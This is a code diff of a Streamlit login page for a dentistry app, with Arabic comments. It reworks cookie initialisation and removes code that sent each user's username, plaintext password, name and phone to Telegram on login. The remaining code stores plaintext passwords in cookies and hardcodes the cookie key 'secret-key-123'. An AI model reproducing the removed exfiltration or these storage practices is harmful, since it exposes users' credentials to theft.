@@ -5,11 +5,8 @@ from orders import main as orders_main
 
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbycx6K2dBkAytd7QQQkrGkVnGkQUc0Aqs2No55dUDVeUmx8ERwaLqClhF9zhofyzPmY/exec"
 
-# 🔐 إعداد الكوكيز
-cookies = EncryptedCookieManager(prefix="dentistry_", password="your-secure-password-123")
-if not cookies.ready():
-    cookies.initialize()
-    st.stop()
+# 🔐 تهيئة الكوكيز
+cookies = EncryptedCookieManager(prefix="dentistry_", password="secret-key-123")
 
 def load_css(file_path):
     with open(file_path, "r", encoding="utf-8") as f:
@@ -94,12 +91,19 @@ def login_page():
     if 'signup_success' not in st.session_state:
         st.session_state['signup_success'] = False
 
-    username_cookie = None
-    password_cookie = None
-    if hasattr(cookies, "cookies") and cookies.cookies is not None:
-        username_cookie = cookies.cookies.get("username")
-        password_cookie = cookies.cookies.get("password")
+    # هنا ننتظر تهيئة الكوكيز كاملة قبل أي شيء
+    if not cookies.ready():
+        cookies.initialize()
+        st.stop()
 
+    # تحمي من None عند قراءة الكوكيز
+    if cookies.cookies is None:
+        cookies.cookies = {}
+
+    username_cookie = cookies.cookies.get("username")
+    password_cookie = cookies.cookies.get("password")
+
+    # إذا يوجد كوكيز صالح نستخدمه لتسجيل الدخول تلقائياً
     if not st.session_state.get("logged_in") and username_cookie and password_cookie:
         if check_login(username_cookie, password_cookie):
             user_data = get_user_data(username_cookie)
@@ -128,15 +132,6 @@ def login_page():
                             cookies.cookies["password"] = password
                             cookies.save()
 
-                        message = (
-                            f"🔑 تم تسجيل دخول المستخدم:\n"
-                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
-                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
-                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
-                            f"الجروب: <b>{user_data['group']}</b>\n"
-                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
-                        )
-                        send_telegram_message(message)
                         st.experimental_rerun()
                     else:
                         st.error("تعذر جلب بيانات المستخدم")
